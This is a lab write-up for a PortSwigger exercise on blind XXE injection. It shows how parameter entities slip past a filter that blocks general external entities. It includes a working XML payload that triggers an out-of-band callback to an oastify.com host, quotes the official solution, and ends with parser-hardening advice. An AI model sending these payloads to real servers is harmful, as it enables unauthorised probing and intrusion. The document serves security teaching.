# Blind XXE with out-of-band interaction via XML parameter entities

**Category:** XXE Injection
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

The previous lab proved blind XXE by making the server call home through a regular external
entity. This lab asks the same question against a parser that blocks regular entities specifically
— a common, narrow defensive measure that stops the exact payload from the last lab cold. XML has a
second, less obvious entity mechanism built for a different purpose that turns out to route around
that restriction entirely.

## The Target

The same "Check stock" endpoint and blind (non-reflecting) behavior as the previous lab, but this
time the application's parser has been configured to reject documents containing regular external
entity declarations — the `<!ENTITY xxe SYSTEM "...">` pattern that worked before now gets
rejected outright rather than silently ignored.

## The Investigation

XML actually defines two kinds of entities: general entities (`<!ENTITY name "...">`, referenced as
`&name;` anywhere in the document body) and parameter entities (`<!ENTITY % name "...">`,
referenced as `%name;`, but only usable *inside the DTD itself*, never in the document body). A
parser that specifically filters for the `&name;` general-entity pattern — or for the string
`<!ENTITY` followed directly by a name rather than `%` — can miss the parameter entity form
entirely while still resolving it exactly the same way during DTD processing. That gap is the
whole lab: swap the blocked general entity for a parameter entity, and reference it with `%xxe;`
instead of `&xxe;`, entirely within the `DOCTYPE` declaration rather than the document body.

## The Exploit

We reused the exact out-of-band mechanism from the previous lab — a random subdomain under
`oastify.com`, watched by the lab's own solve-detection logic rather than a Collaborator client —
but declared and invoked the entity as a parameter entity instead of a general one:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://RANDOM.oastify.com">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Note that `productId` stays as the literal value `1` here — there's nothing to reference `%xxe;`
with in the document body, since parameter entities are invisible outside the DTD. The `%xxe;`
reference immediately following the declaration is what triggers resolution: the parser expands it
while still processing the `DOCTYPE`, before it ever gets to the `stockCheck` element, which is
enough to fire the outbound request. We polled the lab's home page the same way as before and it
flipped to solved within the first couple of checks.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution is structurally identical: intercept the "Check stock" request, insert
`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>` using
"Insert Collaborator payload" for the subdomain, send it, then poll the Collaborator tab for the
resulting interaction. The parameter-entity substitution is exactly the technique we used.

The divergence is the same one as the previous lab, for the same underlying reason: we relied on
the lab platform's own detection of interactions against `*.oastify.com` rather than Burp
Collaborator's client and polling UI, since we didn't have Burp Suite Professional available. The
XML technique — general entity blocked, parameter entity substituted in its place — is identical
in both approaches; only the mechanism for confirming the resulting network callback differs.

## What This Teaches Us

This lab is really about the incompleteness of entity-based filtering as a defense. Blocking the
literal `<!ENTITY name SYSTEM "...">` pattern (or refusing to resolve `&name;` references) closes
off general entities but leaves parameter entities untouched, because they're syntactically and
semantically a different construct — different declaration syntax, different reference syntax,
different valid scope. A filter written against one form doesn't automatically cover the other. The
actual fix has to happen at the parser configuration level (disabling all external entity
resolution, general and parameter, plus DTD processing generally) rather than as an input filter
trying to pattern-match dangerous-looking XML, because XML gives an attacker more than one syntactic
path to the same resolution behavior.
